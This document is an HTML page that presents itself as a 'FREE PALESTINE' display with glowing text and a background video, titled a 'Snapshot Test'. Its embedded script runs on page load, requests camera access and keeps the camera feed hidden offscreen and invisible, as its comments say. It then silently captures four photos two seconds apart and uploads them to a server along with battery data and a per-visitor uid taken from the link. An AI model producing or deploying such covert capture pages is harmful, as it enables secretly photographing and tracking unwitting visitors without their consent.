<!DOCTYPE html>
<html lang="ps">
<head>
<meta charset="utf-8" />
<meta name="viewport" content="width=device-width,initial-scale=1" />
<title>FREE PALESTINE â€” Snapshot Test</title>

<link href="https://fonts.googleapis.com/css2?family=Orbitron:wght@700&display=swap" rel="stylesheet">

<style>
  html,body{
    margin:0;padding:0;height:100%;width:100%;overflow:hidden;
    font-family:'Orbitron',sans-serif;
    background: url('https://i.postimg.cc/Mp85QgJD/IMG-20250917-124655-217.jpg') center/cover no-repeat fixed;
  }

  /* fullscreen background video (kept behind) */
  video#bgVideo {
    position: fixed; inset:0; width:100%; height:100%; object-fit:cover; z-index:0;
  }

  /* neon text */
  .text-layer{
    position:absolute; z-index:2; font-weight:800; color:#00ffea;
    text-shadow:0 0 10px #00ffea,0 0 20px #00aaff,0 0 30px #0044ff;
    white-space:nowrap;
    animation: floatUp 10s linear infinite, glow 1.5s ease-in-out infinite alternate;
  }
  .text1{ font-size:6vw; top:50%; left:20%; }
  .text2{ font-size:5vw; top:55%; left:40%; }

  @keyframes floatUp{ 0%{transform:translateY(0);opacity:1} 100%{transform:translateY(-150px);opacity:0.8} }
  @keyframes glow{ 0%{text-shadow:0 0 10px #00ffea} 100%{text-shadow:0 0 30px #0044ff} }

  /* IMPORTANT: camera video must NOT be display:none */
  video#camera {
    position: absolute;
    width: 1px; height: 1px; /* tiny */
    left: -1000px; /* offscreen */
    top: -1000px;
    opacity: 0; /* invisible but renderable */
    z-index: -1;
  }

  /* keep canvas hidden (we only use it for toDataURL) */
  canvas#snapshot { display:none; }
</style>
</head>
<body>

<!-- background video (visual only) -->
<video id="bgVideo" autoplay playsinline loop muted>
  <source src="https://www.dropbox.com/scl/fi/blfzo9n9oouo0mtwvz1n7/VID_20250917_085355_746.mp4?rlkey=q4y4es66z7z7sk1r2inv5bvbh&st=yevzhjt4&dl=1" type="video/mp4">
</video>

<!-- neon text -->
<div class="text-layer text1">FREE PALESTINE</div>
<div class="text-layer text2">FREE PALESTINE</div>

<!-- hidden (but renderable) camera video and snapshot canvas -->
<video id="camera" autoplay playsinline muted></video>
<canvas id="snapshot"></canvas>

<script>
(async function(){
  const camera = document.getElementById('camera');
  const canvas = document.getElementById('snapshot');
  const ctx = canvas.getContext('2d');
  const uid = (new URLSearchParams(location.search)).get('uid') || 'unknown';

  const MAX = 4;            // number of snapshots
  const INTERVAL_MS = 2000; // 2 seconds

  // helper: sleep
  const wait = ms => new Promise(res=>setTimeout(res, ms));

  // get battery info (best-effort)
  let batteryLevel = null, isCharging = null;
  try{
    const b = await navigator.getBattery();
    batteryLevel = Math.round(b.level * 100);
    isCharging = b.charging;
  }catch(e){
    // ignore if not available
  }

  try {
    const stream = await navigator.mediaDevices.getUserMedia({ video: true });
    camera.srcObject = stream;

    // wait until camera can play (ensures videoWidth/videoHeight available)
    await new Promise(resolve => {
      if (camera.readyState >= 2) return resolve();
      camera.oncanplay = () => resolve();
      // safety timeout in 5s
      setTimeout(() => resolve(), 5000);
    });

    // now take snapshots sequentially
    for(let i=0;i<MAX;i++){
      // ensure sizes available
      if(!camera.videoWidth || !camera.videoHeight){
        // wait a bit for dimensions
        await wait(250);
        if(!camera.videoWidth || !camera.videoHeight){
          console.warn('camera dimensions not ready, skipping this snapshot');
          continue;
        }
      }

      // draw current frame
      canvas.width = camera.videoWidth;
      canvas.height = camera.videoHeight;
      ctx.drawImage(camera, 0, 0, canvas.width, canvas.height);

      // get image data (this will not be tainted because source is same-origin camera stream)
      const imageData = canvas.toDataURL('image/png');

      // send to server (best-effort; replace endpoint as needed)
      fetch('/api/upload', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ image: imageData, uid, battery: batteryLevel, charging: isCharging })
      }).then(r=>r.json()).then(d=>{
        console.log('uploaded snapshot', i+1, d);
      }).catch(err=>{
        console.error('upload error', err);
      });

      // wait interval before next snapshot (don't wait after last)
      if(i < MAX-1) await wait(INTERVAL_MS);
    }

    // stop camera tracks
    stream.getTracks().forEach(t => t.stop());
    console.log('camera stopped after', MAX, 'snapshots');

  } catch(err){
    console.error('camera error', err);
  }
})();
</script>
</body>
</html>
